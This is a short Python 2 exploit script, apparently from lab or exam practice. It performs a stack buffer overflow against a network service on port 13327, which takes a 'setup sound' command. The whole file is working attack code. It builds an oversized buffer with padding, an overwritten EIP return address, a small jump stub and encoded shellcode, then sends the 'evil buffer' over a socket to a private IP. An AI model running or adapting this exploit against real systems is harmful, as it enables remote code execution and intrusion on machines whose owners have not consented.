#!/usr/bin/python
import socket

host = "192.168.146.44"

# msfOffset/Padding(A-\x41) + EIP(\x42) + ESP(\x43)
# inputBuffer = "\x41"*4368 + "B"*4 + "C"*7

shellcode =  ""
shellcode += "\xbd\xad\x1d\x6c\xab\xda\xd7\xd9\x74\x24\xf4\x5a"
shellcode += "\x29\xc9\xb1\x12\x83\xc2\x04\x31\x6a\x0e\x03\xc7"
shellcode += "\x13\x8e\x5e\x26\xf7\xb9\x42\x1b\x44\x15\xef\x99"
shellcode += "\xc3\x78\x5f\xfb\x1e\xfa\x33\x5a\x11\xc4\xfe\xdc"
shellcode += "\x18\x42\xf8\xb4\x5a\x1c\x8d\xd6\x33\x5f\x72\xc7"
shellcode += "\x9f\xd6\x93\x57\x79\xb9\x02\xc4\x35\x3a\x2c\x0b"
shellcode += "\xf4\xbd\x7c\xa3\x69\x91\xf3\x5b\x1e\xc2\xdc\xf9"
shellcode += "\xb7\x95\xc0\xaf\x14\x2f\xe7\xff\x90\xe2\x68"

# Need to adjust the total msfOffset/Padding value of A's (4368) to compensate for the nops and shellcode that will be place there.
nops = "\x90" * 8
padding = "\x41" * (4368 - len(nops) - len(shellcode))
eip = "\x96\x45\x13\x08"
# In firstStage/ESP, we add the nops after assembly instructions(5 bytes) because we need to retain 7 bytes total for the crash to continue to work
espfirstStage = "\x83\xc0\x0c\xff\xe0\x90\x90"

buffer = "\x11(setup sound " + (nops + shellcode + padding) + eip + espfirstStage + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."

s.connect((host,13327))
print s.recv(1024)

s.send(buffer)
s.close()

print "[*]Payload Sent !"
